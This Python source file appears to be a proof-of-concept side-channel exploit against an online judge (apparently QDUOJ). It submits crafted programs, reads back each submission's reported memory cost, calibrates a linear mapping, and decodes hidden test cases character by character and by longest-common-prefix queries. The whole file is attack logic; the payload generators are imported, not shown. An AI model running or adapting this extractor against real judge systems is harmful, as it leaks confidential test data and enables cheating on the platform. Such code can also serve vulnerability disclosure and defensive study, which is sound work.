import numpy as np
try:
    from client import OJClient
    from payload import get_calibration_payload, get_character_extraction_payload, get_lcp_extraction_payload
except ImportError:
    from poc.client import OJClient
    from poc.payload import get_calibration_payload, get_character_extraction_payload, get_lcp_extraction_payload
import time

class SideChannelExtractor:
    def __init__(self, client, problem_id):
        self.client = client
        self.problem_id = problem_id
        self.slope = 0
        self.intercept = 0
        self.is_calibrated = False

    def submit_and_wait(self, code, return_latency=False):
        """Submit code and wait for the result to get memory cost."""
        start_time = time.time()
        sub_id = self.client.submit(self.problem_id, code)
        if not sub_id:
            return (None, time.time() - start_time) if return_latency else None
        
        result = self.client.get_result(sub_id)
        latency = time.time() - start_time
        if result:
            # QDUOJ stores the metrics in 'statistic_info' as 'memory_cost'
            stat_info = result.get('statistic_info', {})
            mem = stat_info.get('memory_cost', result.get('memory_cost', result.get('memory', -1)))
            return (mem, latency) if return_latency else mem
        return (-1, latency) if return_latency else -1

    def calibrate(self, points=[0, 128, 255]):
        """
        Submit calibration payloads to find the linear mapping between 
        `val` and `memory_cost`.
        """
        print("[*] Starting linear regression calibration...")
        x_memory = []
        y_val = []
        
        for val in points:
            print(f"[*] Calibrating val={val}...")
            code = get_calibration_payload(val)
            mem = self.submit_and_wait(code)
            if mem is not None and mem != -1:
                try:
                    mem = int(mem)
                    print(f"[+] val={val} -> memory_cost={mem} bytes")
                    x_memory.append(mem)
                    y_val.append(val)
                except ValueError:
                    print(f"[-] Failed to parse memory cost '{mem}' as integer for val={val}")
            else:
                print(f"[-] Failed to get valid memory cost for val={val} (returned {mem})")
        
        if len(x_memory) > 1:
            # Perform linear regression: y = m*x + b
            x = np.array(x_memory, dtype=float)
            y = np.array(y_val, dtype=float)
            m, b = np.polyfit(x, y, 1)
            self.slope = m
            self.intercept = b
            self.is_calibrated = True
            print(f"[+] Calibration complete.")
            print(f"[+] Model: y = {m} * x + {b}")
            return x_memory, y_val
        else:
            print("[-] Calibration failed. Not enough valid data points.")
            return [], []

    def memory_to_val(self, memory_cost):
        """Map a memory cost back to a `val` (0-255)."""
        if not self.is_calibrated:
            print("[!] Warning: Using default calibration values.")
            return -1 # Should calibrate first
        
        predicted_val = self.slope * memory_cost + self.intercept
        
        # If the predicted value drops significantly below 0, it means the 
        # Memory() allocation wasn't executed (e.g. target mismatch early return).
        if predicted_val < -1:
            return -1
            
        return int(round(predicted_val))

    def extract_character(self, target, upper_bound_char=None):
        """Extract the next character after the `target` string."""
        print(f"[*] Extracting next character for prefix: {repr(target)}")
        code = get_character_extraction_payload(target, upper_bound_char)
        mem = self.submit_and_wait(code)
        
        val = self.memory_to_val(mem)
        if 0 <= val <= 255:
            print(f"[+] Extracted character: '{chr(val)}' (ASCII {val})")
            return chr(val)
        else:
            print(f"[-] Failed to extract character (val={val}, mem={mem})")
            return None

    def extract_lcp_length(self, target):
        """Extract the length of the Longest Common Prefix (LCP) for the next testcase using base-32."""
        print(f"[*] Extracting LCP length against target: {repr(target)}")
        
        # 1. Query the highest non-zero digit
        code = get_lcp_extraction_payload(target, known_digits=[], query_idx=-1)
        mem = self.submit_and_wait(code)
        val = self.memory_to_val(mem)
        print(f"[-] DEBUG LCP query_idx=-1: memory_cost={mem}, decoded_val={val}")
        
        if val == -1:
             return -1 # No valid testcases smaller than target
             
        highest_idx = (val >> 5) & 7
        highest_digit = val & 31
        
        lcp_len = 0
        lcp_len |= (highest_digit << (highest_idx * 5))
        
        # Populate known digits for filtering lower queries
        known_digits = []
        for j in range(5, highest_idx, -1):
            known_digits.append((j, 0))
        known_digits.append((highest_idx, highest_digit))
        
        # 2. Query remaining lower digits
        for query_idx in range(highest_idx - 1, -1, -1):
            code = get_lcp_extraction_payload(target, known_digits=known_digits, query_idx=query_idx)
            mem = self.submit_and_wait(code)
            val = self.memory_to_val(mem)
            print(f"[-] DEBUG LCP query_idx={query_idx}: memory_cost={mem}, decoded_val={val}")
            
            if val == -1:
                digit = 0
            else:
                digit = val & 31
                
            lcp_len |= (digit << (query_idx * 5))
            known_digits.append((query_idx, digit))
            
        print(f"[+] LCP Length: {lcp_len}")
        return lcp_len

    def extract_all(self):
        """Main loop to extract all test cases."""
        if not self.is_calibrated:
            self.calibrate()
            
        testcases = []
        current_target = ""
        
        # The first testcase is the one with the lexicographically largest value.
        # We start with empty target and keep appending characters until EOF.
        print("[*] Beginning extraction of 1st testcase...")
        while True:
            c = self.extract_character(current_target)
            if c is None:
                # Assuming EOF reached for this testcase
                break
            current_target += c
        
        if current_target:
            testcases.append(current_target)
            print(f"[+] Found Testcase 1:\n{current_target}")
        
        # To find subsequent testcases, we use the LCP approach
        while True:
            # We want to find the LCP of the next lexicographically smaller testcase
            # compared to the last found testcase.
            lcp_len = self.extract_lcp_length(testcases[-1])
            
            if lcp_len == -1 or lcp_len == 0 and len(testcases) > 1 and testcases[-1] == "":
                # No more testcases found (or reached end of search space)
                # Note: precise stopping condition might need tuning based on platform behavior.
                break
                
            current_target = testcases[-1][:lcp_len]
            print(f"[*] Found LCP length {lcp_len}. Resuming extraction from: {repr(current_target)}")
            
            # Now we extract character by character again
            first_char = True
            while True:
                if first_char and len(testcases[-1]) > lcp_len:
                    upper_bound = testcases[-1][lcp_len]
                else:
                    upper_bound = None
                    
                c = self.extract_character(current_target, upper_bound_char=upper_bound)
                if c is None:
                    break
                current_target += c
                first_char = False
                
            if current_target:
                testcases.append(current_target)
                print(f"[+] Found Testcase {len(testcases)}:\n{current_target}")
            else:
                break
                
        print("\n[=] Extraction Complete! Extracted Testcases:")
        for i, tc in enumerate(testcases):
            print(f"--- Testcase {i+1} ---")
            print(tc)
            
        return testcases
